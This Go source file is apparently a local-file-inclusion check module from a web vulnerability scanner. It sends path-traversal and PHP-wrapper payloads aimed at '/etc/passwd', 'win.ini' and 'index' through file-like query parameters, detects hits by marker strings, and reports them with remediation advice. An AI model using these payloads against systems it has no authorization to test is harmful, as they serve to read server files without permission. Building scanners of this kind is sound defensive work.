// Package lfipack probes local file inclusion read-only (Wave 1 item
// 39): traversal and wrapper payloads against file-ish parameters
// (file, page, path, include, template, name, load, pg), falling back
// to any parameterized URL. A hit requires a known marker
// (root:x:0:0, [extensions]) AND difference from both the plain
// baseline and a random control. GET-only, ≤2 URLs, 19 requests max.
// Read-only markers — /etc/passwd and win.ini contents are recognized
// by signature, never exfiltrated beyond the marker line.
package lfipack

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/Marwanmorsy999/anpu/internal/adaptive"
	anpuhttp "github.com/Marwanmorsy999/anpu/internal/http"
	"github.com/Marwanmorsy999/anpu/internal/scanner"
	"github.com/Marwanmorsy999/anpu/pkg/models"
)

// maxRequests bounds all HTTP traffic: 2 URLs × (baseline + 8 + control).
const maxRequests = 20

var fileParams = []string{"file", "page", "path", "include", "template", "name", "load", "pg", "doc", "folder"}

var lfiPayloads = []struct {
	name    string
	payload string
	marker  string
	sev     models.Severity
}{
	{"unix-passwd", "/etc/passwd", "root:x:0:0", models.SeverityHigh},
	{"unix-traversal", "....//....//....//etc/passwd", "root:x:0:0", models.SeverityHigh},
	{"unix-encoded", "..%2f..%2f..%2fetc/passwd", "root:x:0:0", models.SeverityHigh},
	{"unix-double-encoded", "..%252f..%252fetc/passwd", "root:x:0:0", models.SeverityHigh},
	{"unix-hostname", "/etc/hostname", "", models.SeverityLow},
	{"win-ini", `C:\Windows\win.ini`, "[extensions]", models.SeverityMedium},
	{"win-traversal", `..\..\..\..\windows\win.ini`, "[extensions]", models.SeverityMedium},
	{"php-filter", "php://filter/convert.base64-encode/resource=index", "", models.SeverityLow},
}

// Scanner implements scanner.Scanner.
type Scanner struct {
	client *anpuhttp.Client
}

// New builds a Scanner.
func New(client *anpuhttp.Client) *Scanner { return &Scanner{client: client} }

// Name implements scanner.Scanner.
func (s *Scanner) Name() string { return "lfipack" }

// Available implements scanner.Scanner.
func (s *Scanner) Available(_ context.Context) bool { return true }

// Run implements scanner.Scanner.
func (s *Scanner) Run(ctx context.Context, sc *scanner.ScanContext) (scanner.StageResult, error) {
	if class, reason := adaptive.SurfaceClass(sc.Endpoints, sc.Technologies, sc.Auth.IsAuthenticated()); class == adaptive.ClassStaticMarketing {
		return scanner.StageResult{Skipped: "LFI skipped: " + reason}, nil
	}
	targets := pickTargets(sc)
	made := 0
	get := func(u string) string {
		if made >= maxRequests {
			return ""
		}
		cctx, cancel := context.WithTimeout(ctx, 10*time.Second)
		defer cancel()
		made++
		resp, err := s.client.Get(cctx, u)
		if err != nil || resp == nil {
			return ""
		}
		return string(resp.Body)
	}

	var findings []models.Finding
	for _, t := range targets {
		param := fileParam(t)
		if param == "" {
			continue
		}
		base := get(t)
		if base == "" {
			continue
		}
		control := get(withParam(t, param, "anpunofilexyz"))
		for _, p := range lfiPayloads {
			if made >= maxRequests {
				break
			}
			body := get(withParam(t, param, p.payload))
			if body == "" || body == base || body == control {
				continue
			}
			matched := p.marker != "" && strings.Contains(body, p.marker)
			// Marker-less probes only count on a stark differential with
			// file-like content shape (multi-line, differs from control).
			if p.marker == "" {
				if strings.Count(body, "\n") < 2 || len(body) < 32 {
					continue
				}
			} else if !matched {
				continue
			}
			obs := fmt.Sprintf("payload %q differs from baseline + control", p.name)
			if matched {
				obs = fmt.Sprintf("payload %q returns marker %q", p.name, firstMarkerLine(body, p.marker))
			}
			findings = append(findings, models.Finding{
				ID: "lfipack-read", Title: fmt.Sprintf("Local file inclusion (%s) via %s", p.name, param),
				Description: fmt.Sprintf("The parameter %s serves local file content for %q (marker %q, differential vs baseline and control): arbitrary file read primitive. Map user input to an allowlist and deny traversals/wrappers. Reproduce: curl TARGET with ?%s=%s. Read-only signature match — file bodies are not stored.", param, p.payload, p.marker, param, url.QueryEscape(p.payload)),
				Severity:    p.sev, Confidence: models.ConfidenceMedium, Category: models.CategoryVulnerability,
				CWE: "CWE-22", Target: sc.Target.Raw, URL: t,
				Evidence: models.Evidence{Observed: obs, Location: "query param " + param},
				Source:   models.SourceCustom, DetectionMethod: "LFI wrapper pack, marker + differential (lfipack, ≤20 requests)",
				Remediation: "Allowlist readable files; reject .. and wrappers.",
			})
			break
		}
		if len(findings) >= 2 {
			break
		}
	}
	return scanner.StageResult{Findings: findings}, nil
}

func pickTargets(sc *scanner.ScanContext) []string {
	var fileish, other []string
	for _, ep := range sc.Endpoints {
		if len(fileish)+len(other) >= 2 {
			break
		}
		u, err := url.Parse(ep.URL)
		if err != nil || !strings.EqualFold(u.Hostname(), sc.Target.Host) || u.RawQuery == "" {
			continue
		}
		if fileParam(ep.URL) != "" && hasFileParamName(u) {
			fileish = append(fileish, ep.URL)
		} else {
			other = append(other, ep.URL)
		}
	}
	out := append(fileish, other...)
	if len(out) > 2 {
		out = out[:2]
	}
	if len(out) == 0 {
		out = []string{sc.Target.Raw + "?file=anputest"}
	}
	return out
}

func hasFileParamName(u *url.URL) bool {
	q := u.Query()
	for _, p := range fileParams {
		for k := range q {
			if strings.EqualFold(k, p) {
				return true
			}
		}
	}
	return false
}

// fileParam prefers a file-ish param, else the first param.
func fileParam(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	q := u.Query()
	for _, p := range fileParams {
		for k := range q {
			if strings.EqualFold(k, p) {
				return k
			}
		}
	}
	for k := range q {
		return k
	}
	return ""
}

func withParam(raw, name, value string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	q := u.Query()
	q.Set(name, value)
	u.RawQuery = q.Encode()
	return u.String()
}

func firstMarkerLine(body, marker string) string {
	for _, line := range strings.Split(body, "\n") {
		if strings.Contains(line, marker) {
			line = strings.TrimSpace(line)
			if len(line) > 80 {
				line = line[:80] + "..."
			}
			return line
		}
	}
	return marker
}
